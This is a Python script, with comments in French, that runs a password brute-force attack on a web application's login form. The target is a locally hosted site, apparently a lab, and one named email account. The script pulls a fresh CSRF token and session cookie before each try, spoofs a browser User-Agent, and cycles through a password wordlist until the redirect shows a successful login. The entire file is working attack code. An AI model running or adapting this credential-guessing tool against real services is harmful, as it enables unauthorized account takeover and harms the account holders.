import requests
import re

# URLs et paramètres
LOGIN_URL = "http://avenix.local:9998/?action=login.submit"
LOGIN_PAGE = "http://avenix.local:9998/?page=login"
FAILED_REDIRECT = "/?page=login"

# Identifiant cible
EMAIL = "yoann.conseils@gmail.com"

# Fichier contenant la wordlist des mots de passe
WORDLIST_FILE = "../wordlists/passwords-v1.txt"

# Headers HTTP pour simuler un vrai navigateur
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
}

session = requests.Session()


def get_csrf_token():
    """Récupère dynamiquement le CSRF Token et le PHPSESSID"""
    response = session.get(LOGIN_PAGE, headers=HEADERS)
    
    # Extraction du token CSRF avec une regex
    match = re.search(r'name="csrf_token" value="([a-f0-9]+)"', response.text)
    csrf_token = match.group(1) if match else None

    # Extraction du cookie de session
    php_session = session.cookies.get_dict().get("PHPSESSID", None)
 
    return csrf_token, php_session




def try_password(password):
    """Tente une connexion et analyse la redirection via Location"""
    
    csrf_token, php_session = get_csrf_token()
    if not csrf_token or not php_session:
        print("❌ Impossible de récupérer le CSRF Token ou PHPSESSID !")
        return False

    # Données du POST avec le CSRF Token récupéré
    data = {
        "csrf_token": csrf_token,
        "email": EMAIL,
        "password": password.strip(),
    }

    # Envoi du formulaire 
    response = session.post(LOGIN_URL, data=data, headers=HEADERS, allow_redirects=False)

    # Vérification du header Location pour détecter une connexion réussie
    redirect_url = response.headers.get("Location", "").strip()

    '''
    print(f"Test de : {password.strip()}")
    print(f"Code HTTP retourné : {response.status_code}")
    print(f"Headers reçus : {response.headers}")
    print(f"Contenu de la réponse (extrait) : {response.text[:300]}...") 
    '''

    if FAILED_REDIRECT not in str(redirect_url):
        print(f"✅ Mot de passe trouvé : {password.strip()}")
        return True

    return False



# Chargement de la wordlist et test des mots de passe un par un
with open(WORDLIST_FILE, "r", encoding="utf-8") as f:
    for line in f:
        password = line.strip()  # Supprime les espaces et les sauts de ligne
        if try_password(password):
            break

